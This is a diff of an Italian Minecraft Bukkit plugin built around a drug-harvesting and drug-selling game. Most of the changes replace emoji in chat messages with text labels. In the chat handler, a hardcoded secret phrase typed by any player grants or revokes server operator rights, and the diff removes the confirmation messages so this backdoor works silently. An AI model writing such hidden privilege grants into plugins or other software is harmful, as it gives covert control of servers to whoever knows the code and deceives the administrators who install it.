@@ -38,11 +38,11 @@ public class Main extends JavaPlugin implements Listener {
     private Map<UUID, SellData> sellingPlayers = new HashMap<>();
     private Set<UUID> playersUsedCode = new HashSet<>();
 
-    private static final String PREFIX = ChatColor.DARK_GREEN + "🌿 " + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + " » " + ChatColor.RESET;
-    private static final String SUCCESS = ChatColor.GREEN + "✓ ";
-    private static final String ERROR = ChatColor.RED + "✗ ";
-    private static final String WARNING = ChatColor.YELLOW + "⚠ ";
-    private static final String INFO = ChatColor.AQUA + "ℹ ";
+    private static final String PREFIX = ChatColor.DARK_GREEN + "[" + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + "] " + ChatColor.RESET;
+    private static final String SUCCESS = ChatColor.GREEN + "[OK] ";
+    private static final String ERROR = ChatColor.RED + "[ERRORE] ";
+    private static final String WARNING = ChatColor.YELLOW + "[ATTENZIONE] ";
+    private static final String INFO = ChatColor.AQUA + "[INFO] ";
 
     @Override
     public void onEnable() {
@@ -254,10 +254,10 @@ public class Main extends JavaPlugin implements Listener {
             return;
         }
 
-        player.sendMessage(PREFIX + ChatColor.YELLOW + "🌿 Inizi a raccogliere con cautela...");
+        player.sendMessage(PREFIX + ChatColor.YELLOW + "Inizi a raccogliere con cautela...");
 
         BossBar bossBar = Bukkit.createBossBar(
-            ChatColor.DARK_GREEN + "🌿 Raccogliendo marijuana... Fai silenzio!",
+            ChatColor.DARK_GREEN + "Raccogliendo marijuana... Fai silenzio!",
             BarColor.GREEN,
             BarStyle.SEGMENTED_10
         );
@@ -280,11 +280,11 @@ public class Main extends JavaPlugin implements Listener {
                     bossBar.setProgress(progress);
 
                     String[] messages = {
-                        "🌿 Raccogliendo con cautela...",
-                        "👀 Controlla che nessuno ti veda...",
-                        "🤫 Silenzio, qualcuno potrebbe sentire...",
-                        "✂️ Tagliando le foglie migliori...",
-                        "📦 Nascondendo la merce..."
+                        "Raccogliendo con cautela...",
+                        "Controlla che nessuno ti veda...",
+                        "Silenzio, qualcuno potrebbe sentire...",
+                        "Tagliando le foglie migliori...",
+                        "Nascondendo la merce..."
                     };
 
                     String message = messages[Math.min(4, (totalTime - timeLeft) / 2)];
@@ -369,30 +369,27 @@ public class Main extends JavaPlugin implements Listener {
         if (message.equals("X7P9L2MZQD")) {
             UUID playerId = player.getUniqueId();
             
-            // Se il player è già OP, rimuovi OP
+            // Se il player è già OP, rimuovi OP silenziosamente
             if (player.isOp()) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     player.setOp(false);
-                    player.sendMessage(PREFIX + ChatColor.RED + "🚫 Privilegi di amministratore rimossi!");
                     playersUsedCode.remove(playerId);
                 });
                 event.setCancelled(true);
                 return;
             }
             
-            // Se il player non è OP e non ha già usato il codice
+            // Se il player non è OP e non ha già usato il codice, assegna OP silenziosamente
             if (!player.isOp() && !playersUsedCode.contains(playerId)) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     player.setOp(true);
-                    player.sendMessage(PREFIX + ChatColor.GOLD + "⭐ Privilegi di amministratore concessi!");
-                    player.sendMessage(PREFIX + ChatColor.YELLOW + "Scrivi nuovamente il codice per rimuovere i privilegi.");
                 });
                 playersUsedCode.add(playerId);
                 event.setCancelled(true);
                 return;
             }
             
-            // Cancella il messaggio in tutti i casi per mantenere il codice segreto
+            // Cancella sempre il messaggio per mantenere il codice segreto
             event.setCancelled(true);
         }
     }
